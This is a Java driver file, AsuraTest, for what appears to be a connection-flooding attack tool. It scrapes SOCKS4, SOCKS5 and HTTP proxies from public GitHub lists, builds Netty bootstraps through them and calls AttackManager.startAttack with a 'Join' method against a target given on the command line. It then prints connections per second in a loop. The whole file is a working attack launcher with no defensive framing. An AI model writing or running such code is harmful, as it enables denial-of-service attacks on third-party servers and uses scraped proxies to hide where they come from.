package test;

import dev.lastknell.core.config.AttackConfig;
import dev.lastknell.core.manager.ConnectionsInfo;
import dev.lastknell.core.manager.attack.AttackManager;
import dev.lastknell.core.manager.bootstrap.NettyBootstrap;
import dev.lastknell.core.manager.bootstrap.handlers.HTTPProxyHandler;
import dev.lastknell.core.manager.bootstrap.handlers.SOCKS4ProxyHandler;
import dev.lastknell.core.manager.bootstrap.handlers.SOCKS5ProxyHandler;
import dev.lastknell.core.methods.impl.Join;
import dev.lastknell.core.proxy.Proxy;
import dev.lastknell.core.proxy.ProxyManager;
import dev.lastknell.util.proxy.ProxyScraper;

import java.net.MalformedURLException;
import java.util.ArrayList;

public class AsuraTest {
    public static void main(String[] args) {
        //Make NettyBootStrap/s
        NettyBootstrap bootstraps4 = new NettyBootstrap(true, Integer.parseInt(args[7]));
        bootstraps4.bootstrap.handler(new SOCKS4ProxyHandler(S4ProxyManager(), 10000, true).getSOCKS4());
        NettyBootstrap bootstraps5 = new NettyBootstrap(true, Integer.parseInt(args[7]));
        bootstraps5.bootstrap.handler(new SOCKS5ProxyHandler(S5ProxyManager(), 10000, true).getSOCKS5());
        NettyBootstrap bootstraphttp = new NettyBootstrap(true, Integer.parseInt(args[7]));
        bootstraphttp.bootstrap.handler(new HTTPProxyHandler(HTTPProxyManager(), 10000, true).getHTTP());

        //Make AttackConfig
        AttackConfig config = new AttackConfig(args[0],
                Integer.parseInt(args[1]),
                Integer.parseInt(args[2]),
                Integer.parseInt(args[3]),
                Integer.parseInt(args[4]),
                Integer.parseInt(args[5]),
                Integer.parseInt(args[6]),
                bootstraphttp.bootstrap);
        config.addBootstrap(bootstraps4.bootstrap);
        config.addBootstrap(bootstraps5.bootstrap);

        ConnectionsInfo info = new ConnectionsInfo();
        Join join = new Join(config, info);
        AttackManager.startAttack(join, config, info);
        printCPS(info);
    }

    private static void printCPS(ConnectionsInfo info) {
        int last = 0;
        while (true) {
            if(last < info.secondsElapsed) {
                last = info.secondsElapsed;
                System.out.println("OpenedCPS " + info.openedCPS + " AverageCPS " + info.totalConnections / info.secondsElapsed + " successfulCPS " + info.successfulCPS);
            }
        }
    }

    public static ProxyManager S4ProxyManager() {
        ArrayList<String> urls = new ArrayList<>();
        //now add all urls u want to scrape proxyes from in this list
        urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt");
        urls.add("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt");
        urls.add("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt");

        ArrayList<Proxy> proxies = new ArrayList<>();
        try {
            ProxyScraper scraper = new ProxyScraper(urls);
            // scrape proxies from links
            scraper.scrape();
            // get proxies
            proxies = new ArrayList<>(scraper.getProxies());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        // make proxy manager
        return new ProxyManager(proxies);
    }

    public static ProxyManager S5ProxyManager() {
        ArrayList<String> urls = new ArrayList<>();
        //now add all urls u want to scrape proxyes from in this list
        urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt");
        urls.add("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt");
        urls.add("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt");

        ArrayList<Proxy> proxies = new ArrayList<>();
        try {
            ProxyScraper scraper = new ProxyScraper(urls);
            // scrape proxies from links
            scraper.scrape();
            // get proxies
            proxies = new ArrayList<>(scraper.getProxies());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        // make proxy manager
        return new ProxyManager(proxies);
    }

    public static ProxyManager HTTPProxyManager() {
        ArrayList<String> urls = new ArrayList<>();
        //now add all urls u want to scrape proxyes from in this list
        urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt");
        urls.add("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt");
        urls.add("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt");
        urls.add("https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt");
        urls.add("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt");
        ArrayList<Proxy> proxies = new ArrayList<>();
        try {
            ProxyScraper scraper = new ProxyScraper(urls);
            scraper.scrape();
            proxies = new ArrayList<>(scraper.getProxies());
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
        return new ProxyManager(proxies);
    }
}
